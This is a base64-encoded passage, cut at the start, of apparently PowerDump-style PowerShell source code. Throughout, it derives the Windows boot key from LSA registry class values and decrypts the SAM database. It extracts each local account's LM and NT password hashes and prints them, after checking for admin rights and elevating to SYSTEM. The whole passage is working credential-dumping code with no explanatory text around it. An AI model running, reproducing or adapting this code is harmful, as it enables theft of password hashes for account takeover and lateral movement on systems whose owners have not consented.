oJHNbMV0pIC1iYW5kIDB4MDMpLCA1KSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzJdKSwzKTsKICAgICAgICAgICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzJdKSAtYmFuZCAweDA3KSwgNCkgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1szXSksNCk7CiAgICAgICAgICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1szXSkgLWJhbmQgMHgwRiksIDMpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbNF0pLDUpOwogICAgICAgICAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbNF0pIC1iYW5kIDB4MUYpLCAyKSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzVdKSw2KTsKICAgICAgICAgICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzVdKSAtYmFuZCAweDNGKSwgMSkgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1s2XSksNyk7CiAgICAgICAgICAgICRrZXkgKz0gJChbaW50XSgkc1s2XSkgLWJhbmQgMHg3Rik7CiAgICAgICAgICAgIDAuLjcgfCAlewogICAgICAgICAgICAgICAgJGtleVskX10gPSBbU2hpZnRdOjpMZWZ0KCRrZXlbJF9dLCAxKTsKICAgICAgICAgICAgICAgICRrZXlbJF9dID0gJG9kZF9wYXJpdHlbJGtleVskX11dOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gLCRrZXk7CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIE5ld1JDNChbYnl0ZVtdXSRrZXkpCiAgICAgICAgewogICAgICAgICAgICByZXR1cm4gbmV3LW9iamVjdCBPYmplY3QgfAogICAgICAgICAgICBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSBrZXkgJGtleSAtUGFzc1RocnUgfAogICAgICAgICAgICBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSBTICRudWxsIC1QYXNzVGhydSB8CiAgICAgICAgICAgIEFkZC1NZW1iZXIgU2NyaXB0TWV0aG9kIGluaXQgewogICAgICAgICAgICAgICAgaWYgKC1ub3QgJHRoaXMuUykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBbYnl0ZVtdXSR0aGlzLlMgPSAwLi4yNTU7CiAgICAgICAgICAgICAgICAgICAgMC4uMjU1IHwgJSAtYmVnaW57W2xvbmddJGo9MDt9ewogICAgICAgICAgICAgICAgICAgICAgICAkaiA9ICgkaiArICR0aGlzLmtleVskKCRfICUgJHRoaXMua2V5Lkxlbmd0aCldICsgJHRoaXMuU1skX10pICUgJHRoaXMuUy5MZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgICAgICR0ZW1wID0gJHRoaXMuU1skX107ICR0aGlzLlNbJF9dID0gJHRoaXMuU1skal07ICR0aGlzLlNbJGpdID0gJHRlbXA7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSAtUGFzc1RocnUgfAogICAgICAgICAgICBBZGQtTWVtYmVyIFNjcmlwdE1ldGhvZCAiZW5jcnlwdCIgewogICAgICAgICAgICAgICAgJGRhdGEgPSAkYXJnc1swXTsKICAgICAgICAgICAgICAgICR0aGlzLmluaXQoKTsKICAgICAgICAgICAgICAgICRvdXRidWYgPSBuZXctb2JqZWN0IGJ5dGVbXSAkKCRkYXRhLkxlbmd0aCk7CiAgICAgICAgICAgICAgICAkUzIgPSAkdGhpcy5TWzAuLiR0aGlzLlMuTGVuZ3RoXTsKICAgICAgICAgICAgICAgIDAuLiQoJGRhdGEuTGVuZ3RoLTEpIHwgJSAtYmVnaW57JGk9MDskaj0wO30gewogICAgICAgICAgICAgICAgICAgICRpID0gKCRpKzEpICUgJFMyLkxlbmd0aDsKICAgICAgICAgICAgICAgICAgICAkaiA9ICgkaiArICRTMlskaV0pICUgJFMyLkxlbmd0aDsKICAgICAgICAgICAgICAgICAgICAkdGVtcCA9ICRTMlskaV07JFMyWyRpXSA9ICRTMlskal07JFMyWyRqXSA9ICR0ZW1wOwogICAgICAgICAgICAgICAgICAgICRhID0gJGRhdGFbJF9dOwogICAgICAgICAgICAgICAgICAgICRiID0gJFMyWyAkKCRTMlskaV0rJFMyWyRqXSkgJSAkUzIuTGVuZ3RoIF07CiAgICAgICAgICAgICAgICAgICAgJG91dGJ1ZlskX10gPSAoJGEgLWJ4b3IgJGIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmV0dXJuICwkb3V0YnVmOwogICAgICAgICAgICB9IC1QYXNzVGhydQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBkZXNfZW5jcnlwdChbYnl0ZVtdXSRkYXRhLCBbYnl0ZVtdXSRrZXkpCiAgICAgICAgewogICAgICAgICAgICByZXR1cm4gLChkZXNfdHJhbnNmb3JtICRkYXRhICRrZXkgJHRydWUpCiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIGRlc19kZWNyeXB0KFtieXRlW11dJGRhdGEsIFtieXRlW11dJGtleSkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiAsKGRlc190cmFuc2Zvcm0gJGRhdGEgJGtleSAkZmFsc2UpCiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIGRlc190cmFuc2Zvcm0oW2J5dGVbXV0kZGF0YSwgW2J5dGVbXV0ka2V5LCAkZG9FbmNyeXB0KQogICAgICAgIHsKICAgICAgICAgICAgJGRlcyA9IG5ldy1vYmplY3QgU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkRFU0NyeXB0b1NlcnZpY2VQcm92aWRlcjsKICAgICAgICAgICAgJGRlcy5Nb2RlID0gW1NlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6RUNCOwogICAgICAgICAgICAkZGVzLlBhZGRpbmcgPSBbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6Tm9uZTsKICAgICAgICAgICAgJGRlcy5LZXkgPSAka2V5OwogICAgICAgICAgICAkZGVzLklWID0gJGtleTsKICAgICAgICAgICAgJHRyYW5zZm9ybSA9ICRudWxsOwogICAgICAgICAgICBpZiAoJGRvRW5jcnlwdCkgeyR0cmFuc2Zvcm0gPSAkZGVzLkNyZWF0ZUVuY3J5cHRvcigpO30KICAgICAgICAgICAgZWxzZXskdHJhbnNmb3JtID0gJGRlcy5DcmVhdGVEZWNyeXB0b3IoKTt9CiAgICAgICAgICAgICRyZXN1bHQgPSAkdHJhbnNmb3JtLlRyYW5zZm9ybUZpbmFsQmxvY2soJGRhdGEsIDAsICRkYXRhLkxlbmd0aCk7CiAgICAgICAgICAgIHJldHVybiAsJHJlc3VsdDsKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gR2V0LVJlZ0tleUNsYXNzKFtzdHJpbmddJGtleSwgW3N0cmluZ10kc3Via2V5KQogICAgICAgIHsKICAgICAgICAgICAgc3dpdGNoICgkS2V5KSB7CiAgICAgICAgICAgICAgICAiSEtDUiIgeyAkbktleSA9IDB4ODAwMDAwMDB9ICNISyBDbGFzc2VzIFJvb3QKICAgICAgICAgICAgICAgICJIS0NVIiB7ICRuS2V5ID0gMHg4MDAwMDAwMX0gI0hLIEN1cnJlbnQgVXNlcgogICAgICAgICAgICAgICAgIkhLTE0iIHsgJG5LZXkgPSAweDgwMDAwMDAyfSAjSEsgTG9jYWwgTWFjaGluZQogICAgICAgICAgICAgICAgIkhLVSIgIHsgJG5LZXkgPSAweDgwMDAwMDAzfSAjSEsgVXNlcnMKICAgICAgICAgICAgICAgICJIS0NDIiB7ICRuS2V5ID0gMHg4MDAwMDAwNX0gI0hLIEN1cnJlbnQgQ29uZmlnCiAgICAgICAgICAgICAgICBkZWZhdWx0IHsgCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgIkludmFsaWQgS2V5LiBVc2Ugb25lIG9mIHRoZSBmb2xsb3dpbmcgb3B0aW9ucyBIS0NSLCBIS0NVLCBIS0xNLCBIS1UsIEhLQ0MiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJEtFWVFVRVJZVkFMVUUgPSAweDE7CiAgICAgICAgICAgICRLRVlSRUFEID0gMHgxOTsKICAgICAgICAgICAgJEtFWUFMTEFDQ0VTUyA9IDB4M0Y7CiAgICAgICAgICAgICRyZXN1bHQgPSAiIjsKICAgICAgICAgICAgW2ludF0kaGtleT0wCiAgICAgICAgICAgIGlmICgtbm90IFtQb3dlckR1bXAuTmF0aXZlXTo6UmVnT3BlbktleUV4KCRua2V5LCRzdWJrZXksMCwkS0VZUkVBRCxbcmVmXSRoa2V5KSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGNsYXNzVmFsID0gTmV3LU9iamVjdCBUZXh0LlN0cmluZ2J1aWxkZXIgMTAyNAogICAgICAgICAgICAgICAgW2ludF0kbGVuID0gMTAyNAogICAgICAgICAgICAgICAgaWYgKC1ub3QgW1Bvd2VyRHVtcC5OYXRpdmVdOjpSZWdRdWVyeUluZm9LZXkoJGhrZXksJGNsYXNzVmFsLFtyZWZdJGxlbiwwLFtyZWZdJG51bGwsW3JlZl0kbnVsbCwKICAgICAgICAgICAgICAgICAgICBbcmVmXSRudWxsLFtyZWZdJG51bGwsW3JlZl0kbnVsbCxbcmVmXSRudWxsLFtyZWZdJG51bGwsMCkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRjbGFzc1ZhbC5Ub1N0cmluZygpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtRXJyb3IgIlJlZ1F1ZXJ5SW5mb0tleSBmYWlsZWQiOwogICAgICAgICAgICAgICAgfSAgIAogICAgICAgICAgICAgICAgW1Bvd2VyRHVtcC5OYXRpdmVdOjpSZWdDbG9zZUtleSgkaGtleSkgfCBPdXQtTnVsbAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtRXJyb3IgIkNhbm5vdCBvcGVuIGtleSI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICRyZXN1bHQ7CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIEdldC1Cb290S2V5CiAgICAgICAgewogICAgICAgICAgICAkcyA9IFtzdHJpbmddOjpKb2luKCIiLCQoIkpEIiwiU2tldzEiLCJHQkciLCJEYXRhIiB8ICV7R2V0LVJlZ0tleUNsYXNzICJIS0xNIiAiU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcTHNhXCRfIn0pKTsKICAgICAgICAgICAgJGIgPSBuZXctb2JqZWN0IGJ5dGVbXSAkKCRzLkxlbmd0aC8yKTsKICAgICAgICAgICAgMC4uJCgkYi5MZW5ndGgtMSkgfCAleyRiWyRfXSA9IFtDb252ZXJ0XTo6VG9CeXRlKCRzLlN1YnN0cmluZygkKCRfKjIpLDIpLDE2KX0KICAgICAgICAgICAgJGIyID0gbmV3LW9iamVjdCBieXRlW10gMTY7CiAgICAgICAgICAgIDB4OCwgMHg1LCAweDQsIDB4MiwgMHhiLCAweDksIDB4ZCwgMHgzLCAweDAsIDB4NiwgMHgxLCAweGMsIDB4ZSwgMHhhLCAweGYsIDB4NyB8ICUgLWJlZ2lueyRpPTA7fXskYjJbJGldPSRiWyRfXTskaSsrfQogICAgICAgICAgICByZXR1cm4gLCRiMjsKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gR2V0LUhCb290S2V5CiAgICAgICAgewogICAgICAgICAgICBwYXJhbShbYnl0ZVtdXSRib290a2V5KTsKICAgICAgICAgICAgJGFxd2VydHkgPSBbVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCIhQCMkJV4mKigpcXdlcnR5VUlPUEF6eGN2Ym5tUVFRUVFRUVFRUVFRKSgqQCYlYDAiKTsKICAgICAgICAgICAgJGFudW0gPSBbVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCIwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5YDAiKTsKICAgICAgICAgICAgJGsgPSBHZXQtSXRlbSBIS0xNOlxTQU1cU0FNXERvbWFpbnNcQWNjb3VudDsKICAgICAgICAgICAgaWYgKC1ub3QgJGspIHtyZXR1cm4gJG51bGx9CiAgICAgICAgICAgIFtieXRlW11dJEYgPSAkay5HZXRWYWx1ZSgiRiIpOwogICAgICAgICAgICBpZiAoLW5vdCAkRikge3JldHVybiAkbnVsbH0KICAgICAgICAgICAgJHJjNGtleSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1XTo6Q3JlYXRlKCkuQ29tcHV0ZUhhc2goJEZbMHg3MC4uMHg3Rl0gKyAkYXF3ZXJ0eSArICRib290a2V5ICsgJGFudW0pOwogICAgICAgICAgICAkcmM0ID0gTmV3UkM0ICRyYzRrZXk7CiAgICAgICAgICAgIHJldHVybiAsKCRyYzQuZW5jcnlwdCgkRlsweDgwLi4weDlGXSkpOwogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBHZXQtVXNlck5hbWUoW2J5dGVbXV0kVikKICAgICAgICB7CiAgICAgICAgICAgIGlmICgtbm90ICRWKSB7cmV0dXJuICRudWxsfTsKICAgICAgICAgICAgJG9mZnNldCA9IFtCaXRDb252ZXJ0ZXJdOjpUb0ludDMyKCRWWzB4MGMuLjB4MGZdLDApICsgMHhDQzsKICAgICAgICAgICAgJGxlbiA9IFtCaXRDb252ZXJ0ZXJdOjpUb0ludDMyKCRWWzB4MTAuLjB4MTNdLDApOwogICAgICAgICAgICByZXR1cm4gW1RleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZygkViwgJG9mZnNldCwgJGxlbik7CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIEdldC1Vc2VySGFzaGVzKCR1LCBbYnl0ZVtdXSRoYm9vdGtleSkKICAgICAgICB7CiAgICAgICAgICAgIFtieXRlW11dJGVuY19sbV9oYXNoID0gJG51bGw7IFtieXRlW11dJGVuY19udF9oYXNoID0gJG51bGw7CiAgICAgICAgICAgIGlmICgkdS5IYXNoT2Zmc2V0ICsgMHgyOCAtbHQgJHUuVi5MZW5ndGgpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRsbV9oYXNoX29mZnNldCA9ICR1Lkhhc2hPZmZzZXQgKyA0OwogICAgICAgICAgICAgICAgJG50X2hhc2hfb2Zmc2V0ID0gJHUuSGFzaE9mZnNldCArIDggKyAweDEwOwogICAgICAgICAgICAgICAgJGVuY19sbV9oYXNoID0gJHUuVlskKCRsbV9oYXNoX29mZnNldCkuLiQoJGxtX2hhc2hfb2Zmc2V0KzB4MGYpXTsKICAgICAgICAgICAgICAgICRlbmNfbnRfaGFzaCA9ICR1LlZbJCgkbnRfaGFzaF9vZmZzZXQpLi4kKCRudF9oYXNoX29mZnNldCsweDBmKV07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkdS5IYXNoT2Zmc2V0ICsgMHgxNCAtbHQgJHUuVi5MZW5ndGgpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRudF9oYXNoX29mZnNldCA9ICR1Lkhhc2hPZmZzZXQgKyA4OwogICAgICAgICAgICAgICAgJGVuY19udF9oYXNoID0gW2J5dGVbXV0kdS5WWyQoJG50X2hhc2hfb2Zmc2V0KS4uJCgkbnRfaGFzaF9vZmZzZXQrMHgwZildOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAsKERlY3J5cHRIYXNoZXMgJHUuUmlkICRlbmNfbG1faGFzaCAkZW5jX250X2hhc2ggJGhib290a2V5KTsKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gRGVjcnlwdEhhc2hlcygkcmlkLCBbYnl0ZVtdXSRlbmNfbG1faGFzaCwgW2J5dGVbXV0kZW5jX250X2hhc2gsIFtieXRlW11dJGhib290a2V5KQogICAgICAgIHsKICAgICAgICAgICAgW2J5dGVbXV0kbG1oYXNoID0gJGVtcHR5X2xtOyBbYnl0ZVtdXSRudGhhc2g9JGVtcHR5X250OwogICAgICAgICAgICAjIExNIEhhc2gKICAgICAgICAgICAgaWYgKCRlbmNfbG1faGFzaCkKICAgICAgICAgICAgeyAgICAKICAgICAgICAgICAgICAgICRsbWhhc2ggPSBEZWNyeXB0U2luZ2xlSGFzaCAkcmlkICRoYm9vdGtleSAkZW5jX2xtX2hhc2ggJGFsbXBhc3N3b3JkOwogICAgICAgICAgICB9CiAgICAKICAgICAgICAgICAgIyBOVCBIYXNoCiAgICAgICAgICAgIGlmICgkZW5jX250X2hhc2gpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRudGhhc2ggPSBEZWNyeXB0U2luZ2xlSGFzaCAkcmlkICRoYm9vdGtleSAkZW5jX250X2hhc2ggJGFudHBhc3N3b3JkOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAsKCRsbWhhc2gsJG50aGFzaCkKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gRGVjcnlwdFNpbmdsZUhhc2goJHJpZCxbYnl0ZVtdXSRoYm9vdGtleSxbYnl0ZVtdXSRlbmNfaGFzaCxbYnl0ZVtdXSRsbW50c3RyKQogICAgICAgIHsKICAgICAgICAgICAgJGRlc2tleXMgPSBzaWRfdG9fa2V5ICRyaWQ7CiAgICAgICAgICAgICRtZDUgPSBbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Lk1ENV06OkNyZWF0ZSgpOwogICAgICAgICAgICAkcmM0X2tleSA9ICRtZDUuQ29tcHV0ZUhhc2goJGhib290a2V5WzAuLjB4MGZdICsgW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRyaWQpICsgJGxtbnRzdHIpOwogICAgICAgICAgICAkcmM0ID0gTmV3UkM0ICRyYzRfa2V5OwogICAgICAgICAgICAkb2Jma2V5ID0gJHJjNC5lbmNyeXB0KCRlbmNfaGFzaCk7CiAgICAgICAgICAgICRoYXNoID0gKGRlc19kZWNyeXB0ICAkb2Jma2V5WzAuLjddICRkZXNrZXlzWzBdKSArIAogICAgICAgICAgICAgICAgKGRlc19kZWNyeXB0ICRvYmZrZXlbOC4uJCgkb2Jma2V5Lkxlbmd0aCAtIDEpXSAkZGVza2V5c1sxXSk7CiAgICAgICAgICAgIHJldHVybiAsJGhhc2g7CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIEdldC1Vc2VyS2V5cwogICAgICAgIHsKICAgICAgICAgICAgbHMgSEtMTTpcU0FNXFNBTVxEb21haW5zXEFjY291bnRcVXNlcnMgfCAKICAgICAgICAgICAgICAgIHdoZXJlIHskXy5QU0NoaWxkTmFtZSAtbWF0Y2ggIl5bMC05QS1GYS1mXXs4fSQifSB8IAogICAgICAgICAgICAgICAgICAgIEFkZC1NZW1iZXIgQWxpYXNQcm9wZXJ0eSBLZXlOYW1lIFBTQ2hpbGROYW1lIC1QYXNzVGhydSB8CiAgICAgICAgICAgICAgICAgICAgQWRkLU1lbWJlciBTY3JpcHRQcm9wZXJ0eSBSaWQge1tDb252ZXJ0XTo6VG9JbnQzMigkdGhpcy5QU0NoaWxkTmFtZSwgMTYpfSAtUGFzc1RocnUgfAogICAgICAgICAgICAgICAgICAgIEFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgViB7W2J5dGVbXV0oJHRoaXMuR2V0VmFsdWUoIlYiKSl9IC1QYXNzVGhydSB8CiAgICAgICAgICAgICAgICAgICAgQWRkLU1lbWJlciBTY3JpcHRQcm9wZXJ0eSBVc2VyTmFtZSB7R2V0LVVzZXJOYW1lKCR0aGlzLkdldFZhbHVlKCJWIikpfSAtUGFzc1RocnUgfAogICAgICAgICAgICAgICAgICAgIEFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgSGFzaE9mZnNldCB7W0JpdENvbnZlcnRlcl06OlRvVUludDMyKCR0aGlzLkdldFZhbHVlKCJWIilbMHg5Yy4uMHg5Zl0sMCkgKyAweENDfSAtUGFzc1RocnUKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gRHVtcEhhc2hlcwogICAgICAgIHsKICAgICAgICAgICAgTG9hZEFwaQogICAgICAgICAgICAkYm9vdGtleSA9IEdldC1Cb290S2V5OwogICAgICAgICAgICAkaGJvb3RLZXkgPSBHZXQtSEJvb3RLZXkgJGJvb3RrZXk7CiAgICAgICAgICAgIEdldC1Vc2VyS2V5cyB8ICV7CiAgICAgICAgICAgICAgICAkaGFzaGVzID0gR2V0LVVzZXJIYXNoZXMgJF8gJGhCb290S2V5OwogICAgICAgICAgICAgICAgInswfTp7MX06ezJ9OnszfTo6OiIgLWYgKCRfLlVzZXJOYW1lLCRfLlJpZCwgCiAgICAgICAgICAgICAgICAgICAgW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRoYXNoZXNbMF0pLlJlcGxhY2UoIi0iLCIiKS5Ub0xvd2VyKCksIAogICAgICAgICAgICAgICAgICAgIFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkaGFzaGVzWzFdKS5SZXBsYWNlKCItIiwiIikuVG9Mb3dlcigpKTsKICAgICAgICAgICAgICAgICJgbiIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoW3ByaXZdOjpJc1VzZXJBbkFkbWluKCkpCiAgICAgICAgewogICAgICAgICAgICBpZiAoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLklzU3lzdGVtKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBEdW1wSGFzaGVzCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBFbGV2YXRlUHJpdnMKICAgICAgICAgICAgICAgIGlmIChbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkuSXNTeXN0ZW0pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgRHVtcEhhc2hlcwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICJBZG1pbmlzdHJhdG9yIG9yIFN5c3RlbSBwcml2aWxlZ2VzIG5lY2Vzc2FyeS4iCiAgICAgICAgfQp9
